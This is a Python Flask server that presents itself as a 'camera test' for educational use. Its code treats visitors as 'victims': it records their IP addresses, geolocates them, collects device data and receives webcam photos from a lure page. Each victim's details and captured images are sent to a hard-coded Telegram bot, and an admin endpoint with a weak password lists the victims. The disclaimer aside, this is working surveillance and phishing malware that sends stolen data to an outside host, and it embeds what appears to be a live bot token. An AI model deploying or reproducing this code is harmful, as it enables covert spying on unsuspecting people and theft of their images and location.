#!/usr/bin/env python3
# CAMERA TEST SERVER - FOR EDUCATIONAL PURPOSE ONLY

from flask import Flask, render_template, request, jsonify
import requests
import os
import uuid
import threading
from datetime import datetime
import base64
import logging

app = Flask(__name__)

# === CONFIGURATION - EDIT THIS! ===
BOT_TOKEN = "8217407388:AAEfmfKWBrjboCnzeC9b6bTKZWvbaLGiKcc"  # CHANGE TO YOUR BOT TOKEN
CHAT_ID = "8052190711"  # CHANGE TO YOUR CHAT ID
ADMIN_PASSWORD = "admin123"  # CHANGE THIS PASSWORD

# === DATABASE ===
victims_db = {}
photos_db = {}

# === LOGGING ===
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def send_telegram_alert(victim_info, photo_data=None):
    """Send alert to Telegram"""
    try:
        message = f"""
🚨 <b>NEW CAMERA TEST ACCESS</b> 🚨

<b>Victim ID:</b> <code>{victim_info.get('victim_id', 'N/A')}</code>
<b>IP Address:</b> <code>{victim_info.get('ip', 'N/A')}</code>
<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Location:</b>
├ Country: {victim_info.get('country', 'Unknown')}
├ City: {victim_info.get('city', 'Unknown')}
└ ISP: {victim_info.get('isp', 'Unknown')}

<b>Device Info:</b>
├ Platform: {victim_info.get('platform', 'Unknown')}
├ Browser: {victim_info.get('browser', 'Unknown')}
└ Screen: {victim_info.get('screen', 'Unknown')}

<i>This is a test notification for educational purposes.</i>
"""
        
        # Send message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=10)
        
        # Send photo if available
        if photo_data:
            photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': ('camera_test.jpg', photo_data, 'image/jpeg')}
            data = {'chat_id': CHAT_ID, 'caption': '📸 Camera Test Capture'}
            requests.post(photo_url, data=data, files=files, timeout=15)
            
        return True
    except Exception as e:
        logger.error(f"Telegram error: {e}")
        return False

@app.route('/')
def index():
    """Main camera test page"""
    # Get victim info
    victim_id = str(uuid.uuid4())[:8]
    ip = request.remote_addr
    
    # Get location from IP
    location_info = {}
    try:
        geo_response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp", timeout=5)
        if geo_response.status_code == 200:
            location_info = geo_response.json()
    except:
        pass
    
    # Save victim info
    victim_info = {
        'victim_id': victim_id,
        'ip': ip,
        'user_agent': request.headers.get('User-Agent', 'Unknown'),
        'timestamp': datetime.now().isoformat(),
        'country': location_info.get('country', 'Unknown'),
        'city': location_info.get('city', 'Unknown'),
        'isp': location_info.get('isp', 'Unknown')
    }
    
    victims_db[victim_id] = victim_info
    
    # Send initial alert
    threading.Thread(target=send_telegram_alert, args=(victim_info,)).start()
    
    return render_template('camera_test.html', victim_id=victim_id)

@app.route('/collect', methods=['POST'])
def collect_data():
    """Collect system data from victim"""
    try:
        data = request.json
        victim_id = data.get('victim_id')
        
        if victim_id in victims_db:
            victims_db[victim_id].update(data)
            logger.info(f"Updated data for victim {victim_id}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/upload', methods=['POST'])
def upload_photo():
    """Handle photo upload from camera"""
    try:
        data = request.json
        victim_id = data.get('victim_id')
        photo_base64 = data.get('photo', '')
        
        if not photo_base64 or not victim_id:
            return jsonify({'status': 'error', 'message': 'No data'})
        
        # Decode base64 image
        try:
            image_data = base64.b64decode(photo_base64.split(',')[1])
        except:
            return jsonify({'status': 'error', 'message': 'Invalid image data'})
        
        # Save to database
        photos_db.setdefault(victim_id, []).append(image_data)
        
        # Get victim info
        victim_info = victims_db.get(victim_id, {})
        
        # Send to Telegram
        threading.Thread(target=send_telegram_alert, args=(victim_info, image_data)).start()
        
        logger.info(f"Photo received from victim {victim_id}")
        return jsonify({'status': 'success', 'message': 'Photo received'})
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/admin')
def admin_panel():
    """Admin panel (password protected)"""
    password = request.args.get('password', '')
    if password != ADMIN_PASSWORD:
        return "Access Denied", 403
    
    stats = {
        'total_victims': len(victims_db),
        'total_photos': sum(len(photos) for photos in photos_db.values()),
        'victims': list(victims_db.keys())
    }
    
    return jsonify(stats)

if __name__ == '__main__':
    # Create templates directory
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    print("""
    ╔══════════════════════════════════════════╗
    ║     CAMERA TEST SERVER - EDUCATIONAL     ║
    ║           DO NOT MISUSE!                 ║
    ╚══════════════════════════════════════════╝
    
    [!] IMPORTANT: Edit BOT_TOKEN and CHAT_ID in the code!
    [!] Server starting on http://0.0.0.0:5000
    [!] Admin: /admin?password=admin123
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True)
